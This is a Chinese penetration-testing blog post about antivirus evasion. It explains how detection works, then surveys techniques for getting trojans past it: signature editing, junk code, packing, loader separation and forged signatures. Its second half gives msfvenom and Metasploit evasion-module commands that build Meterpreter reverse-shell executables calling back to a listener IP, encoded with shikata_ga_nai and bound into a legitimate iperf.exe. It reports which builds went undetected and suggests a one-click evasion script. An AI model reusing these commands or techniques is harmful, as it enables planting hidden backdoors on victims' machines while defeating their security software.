---
title: 渗透之免杀
date: 2020-03-17 09:47:11
tags:
	- 渗透
---

1

## 杀毒软件检测方式

### 特征码扫描

机制：

将扫描信息与病毒数据库（即所谓的“病毒特征库”）进行对照，

如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。

杀毒软件在进行查杀的时候，**会挑选文件内部的一段或者几段代码**来作为他识别病毒的方式，

这种代码就叫做**病毒的特征码**；

在病毒样本中，抽取特征代码；

**抽取的代码比较特殊，不大可能与普通正常程序代码吻合；**

抽取的代码要有适当长度，一方面维持特征代码的唯一性，

另一方面保证病毒扫描时候不要有太大的空间与时间的开销。

特征码类别：

1.文件特征码：对付病毒在文件中的存在方式：单一文件特征码、复合文件特征码（通过多处特征进行判断）；

2.内存特征码：对付病毒在内存中的存在方式：单一内存特征码、复合内存特征码

优点：速度快，配备高性能的扫描引擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与。

缺点：采用病毒特征代码法的检测工具，面对不断出现的新病毒，必须不断更新病毒库的版本，否则检测工具便会老化，逐渐失去实用价值；病毒特征代码法对从未见过的新病毒，无法知道其特征代码，因而无法去检测新病毒；病毒特征码如果没有经过充分的检验，可能会出现误报，数据误删，系统破坏，给用户带来麻烦

### 文件校验和法

对文件进行扫描后，可以将正常文件的内容，计算其校验和，将该校验和写入文件中或写入别的文件中保存；在文件使用过程中，定期地或每次使用文件前，检查文件现在内容算出的校验和与原来保存的校验和是否一致，因而可以**发现文件是否感染病毒。**



### 进程行为监测法(沙盒模式)

机制：通过对病毒多年的观察、研究，有一些行为是病毒的共同行为，而且比较特殊，在正常程序中，这些行为比较罕见。比如**注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL**等等。当程序运行时，监视其进程的各种行为，如果发现了病毒行为，立即报警。

优缺点：

1.优点：可发现未知病毒、可相当准确地预报未知的多数病毒；

2.缺点：可能误报警、不能识别病毒名称、有一定实现难度、**需要更多的用户参与判断；**

针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。

### 云查杀

云查杀的特点基本也可以概括为特征查杀，杀软会将较可疑但特征库并没有响应特征的程序传回杀软公司服务器上，进而判断该程序是否为恶意程序，然后做出响应。**所以当你开着杀软的云查杀的时候，有时候刚开始没报病毒，但过一会就提示病毒了，这就是云查杀的效果。**

### 主动防御技术

主动防御并不需要病毒特征码支持，只要杀毒软件能分析并扫描到目标程序的行为，并根据预先设定的规则，判定是否应该进行清除操作 主动防御本来想领先于病毒，让杀毒软件自己变成安全工程师来分析病毒，从而达到以不变应万变的境界。但是，计算机的智能总是在一系列的规则下诞生，而普通用户的技术水平达不到专业分析病毒的水平，两者之间的博弈需要主动防御来平衡。

### 机器学习识别技术

机器学习识别技术既可以做静态样本的二进制分析，又可以运用在沙箱动态行为分析当中，是为内容/行为+算法模式。伴随着深度学习的急速发展，各家厂商也开始尝试运用深度学习技术来识别病毒特征，如瀚思科技的基于深度学习的二进制恶意样本检测。



## 免杀技术发展史

理论上讲，免杀一定是出现在杀毒软件之后的。而通过杀毒软件的发展史不难知道，第一款杀毒软件kill 1.0是Wish公司1987年推出的，也就是说免杀技术至少是在1989年以后才发展起来的。关于世界免杀技术的历史信息已无从考证，但从国内来讲，免杀技术的起步可以说是非常晚了。



## 免杀技术介绍

### 修改特征码

免杀的最基本思想就是破坏特征，这个特征有可能是特征码，有可能是行为特征，只要破坏了病毒与木马所固有的特征，并保证其原有功能没有改变，一次免杀就能完成了。

特征码：能识别一个程序是一个病毒的一段不大于64字节的特征串

就目前的反病毒技术来讲，更改特征码从而达到免杀的效果事实上包含着两种方式。

一种是改特征码，这也是免杀的最初方法。**例如一个文件在某一个地址内有“灰鸽子上线成功！”这么一句话，表明它就是木马**，只要将相应地址内的那句话改成别的就可以了，如果是无关痛痒的，直接将其删掉也未尝不可。

第二种是针对目前推出的校验和查杀技术提出的免杀思想，它的原理虽然仍是特征码，但是已经脱离纯粹意义上特征码的概念，不过万变不离其宗。其实校验和也是根据病毒文件中与众不同的区块计算出来的，如果一个文件某个特定区域的校验和符合病毒库中的特征，那么反病毒软件就会报警。所以如果想阻止反病毒软件报警，只要对病毒的**特定区域进行一定的更改，就会使这一区域的校验和改变，从而达到欺骗反病毒软件的目的。**

修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，**但有时候在没有源码的情况下可以一用。**

### 花指令免杀

花指令其实就是一段毫无意义的指令，**也可以称之为垃圾指令**。花指令是否存在对程序的执行结果没有影响，所以**它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。**

大多数反病毒软件是靠特征码来判断文件是否有毒的，而为了提高精度，现在的特征码都是在一定偏移量限制之内的，否则会对反病毒软件的效率产生严重的影响！而在黑客们为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，自然也就无法正常检测木马了。

### 加壳免杀

说起软件加壳，简单地说，软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。

当我们运行这个加壳的程序时，系统首先会运行程序的“壳”，然后由壳将加密的程序逐步还原到内存中，最后运行程序。这样一来，在我们看来，似乎加壳之后的程序并没有什么变化，然而它却达到了加密的目的，这就是壳的作用。

**加壳虽然对于特征码绕过有非常好的效果**，加密壳基本上可以把特征码全部掩盖，**但是缺点也非常的明显，因为壳自己也有特征。**在某些比较流氓的国产杀软的检测方式下，主流的壳如VMP, Themida等，一旦被检测到加壳直接弹框告诉你这玩意儿有问题，虽然很直接，但是还是挺有效的。有些情况下，有的常见版本的壳会被直接脱掉分析。 面对这种情况可以考虑用一些冷门的加密壳，**有时间精力的可以基于开源的压缩壳改一些源码，效果可能会很不错。**

总得来说，加壳的方式来免杀还是比较实用的，**特别是对于不开源的PE文件，通过加壳可以绕过很多特征码识别。**

### 内存免杀

CPU不可能是为某一款加壳软件而特别设计的，因此某个软件被加壳后的可执行代码CPU是读不懂的。这就要求在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。

因为杀毒软件的内存扫描原理与硬盘上的文件扫描原理都是一样的，都是通过特征码比对的，只不过为了制造迷惑性，大多数反病毒公司的内存扫描与文件扫描采用的不是同一套特征码，**这就导致了一个病毒木马同时拥有两套特征码，必须要将它们全部破坏掉才能躲过反病毒软件的查杀。**

因此，除了加壳外，黑客们对抗反病毒软件的基本思路没变。而对于加壳，只要加一个会混淆程序原有代码的“猛”壳，其实还是能躲过杀毒软件的查杀的。

### 二次编译

metasploit的msfvenom提供了多种格式的payload和encoder，生成的shellcode也为二次加工提供了很大便利，但是也被各大厂商盯得死死的。

而shikata_ga_nai是msf中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样。还可以利用管道进行多重编码进行免杀。

目前msfvenom的encoder特征基本都进入了杀软的漏洞库，很难实现单一encoder编码而绕过杀软，所以对shellcode进行进一步修改编译成了msf免杀的主流。**互联网上有很多借助于C、C#、python等语言对shellcode进行二次编码从而达到免杀的效果。**

### 分离免杀

侯亮大神和倾旋大神都分别提到过payload分离免杀和webshell分离免杀，采用分离法，即将ShellCode和加载器分离。网上各种加载器代码也有很多，各种语言实现的都很容易找到，虽然看起来比较简单，但效果却是不错的。比如侯亮大神提到的shellcode_launcher，加载c代码，基本没有能查杀的AV。

### 资源修改

有些杀软会设置有扫描白名单，**比如之前把程序图标替换为360安全卫士图标就能过360的查杀**。

1.加资源

使用ResHacker对文件进行资源操作，找来多个正常软件，将它们的资源加入到自己软件，如图片，版本信息，对话框等。

2.替换资源

使用ResHacker替换无用的资源（Version等）。

3.加签名

使用签名伪造工具，将正常软件的签名信息加入到自己软件中。

# metasploit自带免杀

Metasploit自身已经提供了一定免杀机制，

比如Evasion模块、MSF自带的C编译模块、大名鼎鼎的shikata_ga_nai编码等等，

但由于msf被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，

但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果。

```
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
```



原始的payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.2.126 LPORT=3333 -f exe -o test.exe
```

生成的文件信息：

```
root@thinkpad:~# file test.exe 
test.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```

在windows上运行，是可以被电脑管家查杀的。

使用encoder进行编码，再看看。

查看有哪些encoders。

```
msfvenom -l encoders
```



评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器了。

我们就用shikata_ga_nai来编码一下。

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.2.126 lport=3333 -e x86/shikata_ga_nai -i 15 -f exe -o test2.exe
```

由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不一样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有一定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。

这个放过来，也是马上就被电脑管家给发现并删除了。

在看看msf的自捆绑免杀。

我们找一个exe文件来做捆绑的对象。就找一个iperf.exe文件。

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.2.126 lport=3333 -x iperf.exe -f exe -o test3.exe
```

这样捆绑后的文件，电脑管家就查不出来了。

还可以把自捆绑和编码结合起来。这样就更难被查杀了。

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.2.126 lport=3333 -e x86/shikata_ga_nai -x iperf.exe -i 15 -f exe -o test4.exe
```

把这些梳理完成之后，可以总结为一个脚本。自己一键免杀。把各种都做出来供选择。

多重编码。前面我们只用了一个编码器。

可以用管道进行多次编码。注意前面的-f都是raw。最后的-f才是exe。

```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 lhost=172.16.2.126 lport=3333 -f raw | msfvenom -e x86/alpha_upper -i 3 -f raw | msfvenom -e x86/countdown -i 3 -x iperf.exe -f exe -o test5.exe
```

（我这个命令不行，总是提示要指定arch。但是我都指定为-a x86，还是不行）

但是编码多了，并一定更好，可能更容易被识别出来。

经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。

2019年1月，metasploit升级到5.0版本，引入了一个新的模块，叫做evasion模块。

官方宣称这个模块可以创建免杀的木马。

在msf里，输入show evasion。可以查看对应的模块。



```
msf5 > use evasion/windows/windows_defender_exe
msf5 evasion(windows/windows_defender_exe) > set filename payload.exe
msf5 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcp
msf5 evasion(windows/windows_defender_exe) > set LHOST 10.211.55.3
msf5 evasion(windows/windows_defender_exe) > set LPORT 3333
msf5 evasion(windows/windows_defender_exe) > run
```

用这样的可以生成payload，只有4K。而且不会被电脑管家查杀出来。

还可以生成install_util(VT查杀率12/71)和hta(VT查杀率14/59)等，因为使用了白名单加载的方式，所以免杀效果相对好一些。



当前有的问题：

```
1、捆绑后，影响了原程序的运行。例如跟iperf.exe绑定后，iperf.exe的正常功能失效了。
	这样就无法在靶机上存留。
2、我觉得应该先得到一个payload，然后再另外用其他工具附加到正常程序后面。

```



参考资料

下面这个系列文章读懂了，就入门了。

这个是TideSec这个团队写的。所有文章在这里。

https://github.com/TideSec/BypassAntiVirus

远控免杀从入门到实践（1）：基础篇

https://www.freebuf.com/articles/system/227461.html

远控免杀从入门到实践（2）工具总结篇

https://www.freebuf.com/articles/system/227462.html

远控免杀从入门到实践(3)-代码篇-C/C++

https://www.freebuf.com/articles/system/227463.html